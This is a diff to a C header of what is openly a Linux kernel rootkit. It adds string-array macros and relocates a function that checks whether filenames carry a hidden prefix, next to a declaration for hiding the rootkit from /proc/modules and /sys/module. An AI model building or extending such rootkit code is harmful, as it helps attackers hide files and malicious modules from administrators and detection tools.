@@ -59,6 +59,32 @@
     } while (0)
 
 /**
+ * Creates a new `string_t` structure with the given string value.
+ *
+ * @param _s_str The string value
+ * @return The new `string_t` structure
+ */
+#define NEW_STRING_ENTRY(_s_str)                        \
+    {                                                   \
+        .s_str = (_s_str), .sz_len = sizeof(_s_str) - 1 \
+    }
+
+/**
+ * Creates an array of `string_t` structures from the given strings.
+ *
+ * @param ... The strings
+ * @return The array of `string_t` structures
+ */
+#define STRING_ARRAY(...)                                   \
+    {                                                       \
+        __MAPX_LIST(NEW_STRING_ENTRY, __VA_ARGS__),         \
+        {                                                   \
+            /* The last element must have a NULL `s_str` */ \
+            NULL, 0                                         \
+        }                                                   \
+    }
+
+/**
  * Structure representing an entry in a list of PIDs.
  */
 typedef struct pid_list_tag {
@@ -128,18 +154,6 @@ static inline pid_t get_effective_pid(const pid_t i32_pid)
 }
 
 /**
- * Does the given file name need to be hidden?
- *
- * @param s_filename The file name to check
- * @return `true` if the given file needs to be hidden, `false` otherwise
- */
-static inline bool is_filename_hidden(const char *const s_filename)
-{
-    // Check the name starts with the hidden prefix
-    return strncmp(s_filename, S_HIDDEN_PREFIX, HIDDEN_PREFIX_LEN) == 0;
-}
-
-/**
  * Copy data from user space to kernel space, chunk by chunk.
  * @note Taken from kernel code (kernel/module.c), as it is static.
  *
@@ -149,6 +163,14 @@ static inline bool is_filename_hidden(const char *const s_filename)
  * @return 0 on success, otherwise an error code
  */
 int copy_chunked_from_user(void *p_dst, const void __user *p_usrc, unsigned long ui64_len);
+
+/**
+ * Does the given file name need to be hidden?
+ *
+ * @param s_filename The file name to check
+ * @return `true` if the given file needs to be hidden, `false` otherwise
+ */
+bool is_filename_hidden(const char *const s_filename);
 
 /**
  * Hides the rootkit from /proc/modules and /sys/module/.
